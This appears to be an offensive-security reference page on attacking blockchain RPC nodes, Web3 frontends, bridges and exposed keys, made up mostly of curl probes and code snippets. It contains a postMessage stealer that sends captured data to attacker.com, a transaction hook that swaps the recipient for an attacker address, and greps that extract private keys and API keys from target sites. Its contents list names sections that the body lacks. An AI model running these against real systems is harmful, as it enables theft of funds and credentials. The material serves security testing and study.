# Blockchain & Web3 Security

> Blockchain infrastructure, DeFi protocols, and Web3 applications introduce unique attack surfaces that traditional web security testing doesn't cover. This section focuses on practical exploitation techniques against blockchain RPC endpoints, smart contract interactions, bridge infrastructure, and Web3 frontend applications.

## Summary

- [RPC Endpoint Attacks](#rpc-endpoint-attacks)
  - [Exposed Debug Methods](#exposed-debug-methods)
  - [Mempool/Txpool Exposure](#mempooltxpool-exposure)
  - [Node Version Disclosure](#node-version-disclosure)
  - [Dangerous RPC Methods by Node Type](#dangerous-rpc-methods-by-node-type)
- [Web3 Frontend Attacks](#web3-frontend-attacks)
  - [postMessage Exploitation](#postmessage-exploitation)
  - [Transaction Manipulation](#transaction-manipulation)
  - [Wallet Connection Hijacking](#wallet-connection-hijacking)
- [Smart Contract Interaction](#smart-contract-interaction)
  - [Read-Only Reentrancy](#read-only-reentrancy)
  - [Price Oracle Manipulation](#price-oracle-manipulation)
  - [Flash Loan Attacks](#flash-loan-attacks)
- [Bridge & Cross-Chain](#bridge--cross-chain)
  - [Bridge Relay Manipulation](#bridge-relay-manipulation)
  - [Cross-Chain Replay](#cross-chain-replay)
- [Key & Credential Exposure](#key--credential-exposure)
  - [Hardcoded Private Keys](#hardcoded-private-keys)
  - [Exposed Mnemonics](#exposed-mnemonics)
  - [API Key Leakage in Frontends](#api-key-leakage-in-frontends)
- [References](#references)

## RPC Endpoint Attacks

### Exposed Debug Methods

Blockchain nodes expose JSON-RPC APIs for interaction. Debug and trace methods should be disabled on public endpoints but are frequently left enabled.

```bash
# Test if debug_traceTransaction is enabled
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_traceTransaction","params":[],"id":1}'

# Response indicating method IS enabled (needs parameters, not disabled):
# {"jsonrpc":"2.0","id":1,"error":{"code":-32602,"message":"missing value for required argument 0"}}

# Response indicating method is properly DISABLED:
# {"jsonrpc":"2.0","id":1,"error":{"code":-32601,"message":"the method does not exist/is not available"}}
```

```bash
# Trace a real transaction (full EVM execution trace)
TX_HASH=$(curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest",true],"id":1}' \
  | jq -r '.result.transactions[0].hash')

curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"debug_traceTransaction\",\"params\":[\"$TX_HASH\"],\"id\":1}"
# Returns: full opcode trace with stack, memory, gas for every instruction
```

```bash
# Batch test all dangerous methods
for method in debug_traceTransaction debug_traceBlockByNumber debug_storageRangeAt \
  debug_accountRange debug_getModifiedAccountsByNumber trace_block trace_transaction \
  trace_filter trace_rawTransaction txpool_content txpool_status txpool_inspect \
  admin_nodeInfo admin_peers admin_addPeer personal_listAccounts personal_unlockAccount \
  eth_accounts miner_start miner_stop; do
  resp=$(curl -s -X POST https://TARGET_RPC \
    -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"$method\",\"params\":[],\"id\":1}")
  error=$(echo "$resp" | jq -r '.error.message // "NO_ERROR"' 2>/dev/null)
  if [ "$error" = "NO_ERROR" ] || echo "$error" | grep -qi "missing.*argument"; then
    echo "[ENABLED] $method"
  fi
done
```

### Mempool/Txpool Exposure

The txpool namespace exposes pending (unmined) transactions, enabling frontrunning and MEV attacks.

```bash
# Check if txpool_content is accessible
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1}'
# If result contains "pending" and "queued" objects, txpool is exposed

# Check txpool_status (summary)
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_status","params":[],"id":1}'
# Returns: {"result":{"pending":"0x5","queued":"0x0"}}

# Inspect txpool (formatted view)
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_inspect","params":[],"id":1}'
```

**Impact of txpool exposure:**
- **Frontrunning**: Monitor for large DEX swaps, submit transaction with higher gas to execute first
- **Sandwich attacks**: Place buy before and sell after a victim's swap to extract value
- **Transaction censorship**: Monitor and selectively target specific addresses
- **Privacy breach**: All pending transactions visible before confirmation

**Comparison — major L2s properly disable txpool:**
```bash
# These should all return "method not found" on public RPCs:
curl -s -X POST https://arb1.arbitrum.io/rpc -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"txpool_status","params":[],"id":1}'
curl -s -X POST https://mainnet.optimism.io -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"txpool_status","params":[],"id":1}'
curl -s -X POST https://mainnet.base.org -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"txpool_status","params":[],"id":1}'
```

### Node Version Disclosure

```bash
# Get exact node software version
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":1}'
# Returns: "geth/v1.13.5-stable/linux-amd64/go1.21.5"
# Or: "cdk-erigon/v2.0.3/linux-amd64/go1.21.5"
# Or: "nitro/v3.6.7-a7c9f1e/linux-amd64/go1.23.1"

# Get chain configuration
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'

# Get fork schedule (Erigon-specific)
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"erigon_forks","params":[],"id":1}'

# Check sync status
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_syncing","params":[],"id":1}'
```

### Dangerous RPC Methods by Node Type

| Node Software | Dangerous Methods | Impact |
|---|---|---|
| **Geth** | `debug_*`, `admin_*`, `personal_*`, `txpool_*`, `miner_*` | RCE via `admin_startRPC`, account unlock, mempool access |
| **Erigon** | `debug_*`, `trace_*`, `txpool_*`, `erigon_*` | Full tracing, mempool, internal chain state |
| **Nethermind** | `debug_*`, `trace_*`, `admin_*`, `txpool_*` | Similar to Geth + Parity trace namespace |
| **Besu** | `debug_*`, `trace_*`, `txpool_*`, `admin_*`, `miner_*` | Full debug suite + miner control |
| **Reth** | `debug_*`, `trace_*`, `txpool_*` | Modern Rust client, similar namespaces |
| **Arbitrum Nitro** | `debug_*`, `txpool_*`, `arbtrace_*` | Nitro-specific tracing + standard debug |

```bash
# Erigon-specific endpoints
curl -s -X POST https://TARGET_RPC -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"erigon_getHeaderByNumber","params":["latest"],"id":1}'
curl -s -X POST https://TARGET_RPC -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"erigon_getLogsByHash","params":["BLOCK_HASH"],"id":1}'

# Geth admin endpoints (critical if exposed)
curl -s -X POST https://TARGET_RPC -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"admin_nodeInfo","params":[],"id":1}'
curl -s -X POST https://TARGET_RPC -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"admin_peers","params":[],"id":1}'

# Personal namespace (can unlock accounts!)
curl -s -X POST https://TARGET_RPC -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
```

## Web3 Frontend Attacks

### postMessage Exploitation

Many Web3 checkout/bridge/swap interfaces use postMessage for iframe communication without origin validation.

```javascript
// Attacker page — capture payment tokens from embedded checkout
window.addEventListener("message", function(event) {
    // No origin check — captures from any iframe
    console.log("Captured:", event.data);
    // event.data may contain: payment_token, redirect_url, transaction_hash
    fetch("https://attacker.com/log?data=" + JSON.stringify(event.data));
});

// Embed the target checkout/bridge in an iframe
document.body.innerHTML = '<iframe src="https://checkout.target.com/pay?token=VALID_TOKEN"></iframe>';
```

```javascript
// Send malicious params to an unvalidated checkout iframe
var iframe = document.querySelector("iframe");
iframe.contentWindow.postMessage({
    type: "PARAMS",
    data: {
        hostname: "attacker.com",      // Redirect post-payment
        enableRedirect: true,
        hideOrderDetails: true,        // Hide from user
        hideCartItems: true
    }
}, "*");
```

### Transaction Manipulation

```javascript
// Intercept and modify transaction parameters before wallet signing
// Target: DeFi frontends that build transactions client-side

// Hook the ethers.js sendTransaction
const originalSend = provider.sendTransaction;
provider.sendTransaction = async function(tx) {
    // Modify transaction: change recipient, amount, or data
    tx.to = "ATTACKER_ADDRESS";
    return originalSend.call(this, tx);
};
```

### Wallet Connection Hijacking

```bash
# Find WalletConnect relay endpoints in frontend JS
curl -s https://TARGET | grep -oP 'wss?://[^"]*walletconnect[^"]*'
curl -s https://TARGET | grep -oP 'wss?://[^"]*relay[^"]*'
curl -s https://TARGET | grep -oP '"projectId"\s*:\s*"[^"]*"'

# Check if WalletConnect project ID is reusable
curl -s "https://relay.walletconnect.com" -H "Origin: https://attacker.com"
```

## Smart Contract Interaction

### Price Oracle Manipulation

```bash
# Find oracle addresses in frontend JS
curl -s https://TARGET/main.js | grep -oP '0x[a-fA-F0-9]{40}' | sort -u

# Query Chainlink price feed
cast call ORACLE_ADDRESS "latestRoundData()" --rpc-url https://TARGET_RPC

# Check if a custom oracle has manipulation vectors
cast call ORACLE_ADDRESS "getPrice(address)" TOKEN_ADDRESS --rpc-url https://TARGET_RPC
```

### Flash Loan Attack Pattern

```solidity
// Generic flash loan attack structure
interface IFlashLoan {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

contract FlashAttack {
    function attack() external {
        // 1. Borrow large amount via flash loan
        // 2. Manipulate price oracle / pool ratio
        // 3. Execute profitable trade at manipulated price
        // 4. Repay flash loan + fee
        // 5. Profit from price difference
    }
}
```

## Bridge & Cross-Chain

### Bridge Relay Manipulation

```bash
# Identify bridge contracts and relay endpoints
curl -s https://bridge.TARGET | grep -oP '0x[a-fA-F0-9]{40}' | sort -u

# Check bridge TVL and historical transactions
curl -s "https://api.llama.fi/protocol/TARGET_BRIDGE"

# Monitor bridge pending transactions (if RPC exposed)
curl -s -X POST https://TARGET_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getLogs","params":[{"fromBlock":"latest","address":"BRIDGE_CONTRACT"}],"id":1}'
```

### Cross-Chain Replay

```bash
# Check if the same contract address exists on multiple chains with different code
for rpc in "https://eth.llamarpc.com" "https://arb1.arbitrum.io/rpc" "https://mainnet.optimism.io"; do
  code=$(curl -s -X POST $rpc -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getCode\",\"params\":[\"TARGET_CONTRACT\",\"latest\"],\"id\":1}" \
    | jq -r '.result')
  echo "$rpc: $(echo $code | wc -c) bytes"
done
```

## Key & Credential Exposure

### Hardcoded Private Keys

```bash
# Search for private keys in JavaScript bundles
curl -s https://TARGET/main.js | grep -oP '0x[a-fA-F0-9]{64}' | while read key; do
  # Check if it's a valid private key by deriving the address
  echo "Potential key: ${key:0:10}..."
done

# Search for mnemonics in source code
curl -s https://TARGET/main.js | grep -oiP '(abandon|ability|able|about|above)\s+(ability|able|about|above|absent)\s+\w+'

# Common hardcoded test keys (check if used in production)
# 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 (Hardhat #0)
# 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d (Hardhat #1)
```

### API Key Leakage in Frontends

```bash
# Extract Infura/Alchemy/QuickNode API keys from JS
curl -s https://TARGET | grep -oP '(infura\.io|alchemy\.com|quiknode\.pro)/[^"'\'']*' | sort -u

# Extract API keys from config files
curl -s https://TARGET/config.json | grep -i "api.*key\|infura\|alchemy\|etherscan"

# Check if extracted RPC URL allows sensitive methods
RPC_URL="https://mainnet.infura.io/v3/EXTRACTED_KEY"
curl -s -X POST "$RPC_URL" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'
```

## References

- [Ethereum JSON-RPC Specification](https://ethereum.github.io/execution-apis/api-documentation/)
- [Ethereum Foundation - MEV](https://ethereum.org/en/developers/docs/mev/)
- [Flashbots - MEV Research](https://writings.flashbots.net/)
- [Trail of Bits - Blockchain Security](https://github.com/trailofbits/publications#blockchain)
- [Consensys - Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [SWC Registry - Smart Contract Weakness Classification](https://swcregistry.io/)
- [DeFi Hack Analysis](https://rekt.news/)
